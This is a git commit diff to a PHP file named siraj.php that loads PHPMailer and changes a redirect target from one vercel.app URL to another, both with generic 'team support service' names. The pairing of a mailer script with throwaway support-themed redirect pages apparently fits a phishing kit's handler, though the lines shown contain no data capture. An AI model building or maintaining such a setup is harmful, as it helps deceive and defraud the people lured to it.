e449cf2fcd36030131405f16ca9cc437246c7e18
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-13 01:18:45 +0800

    Update siraj.php

--- siraj.php
+++ siraj.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-team-for-request-service-here.vercel.app/");
+header("Location: https://request-team-support-free-service.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
